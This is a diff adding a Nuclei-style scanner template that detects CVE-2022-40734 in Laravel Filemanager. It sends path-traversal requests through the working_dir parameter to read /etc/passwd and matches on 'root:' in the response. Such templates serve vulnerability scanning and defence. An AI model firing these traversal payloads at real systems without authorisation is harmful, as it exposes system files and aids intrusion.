@@ -1,0 +1,31 @@
+id: laravel-filemanager-anyfile-read
+info:
+  name: Laravel Filemanager Arbitrary File Read (CVE-2022-40734)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: CVE-2022-40734,arbitrary-file-read
+
+variables:
+  path:
+    - "laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd"
+    - "download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
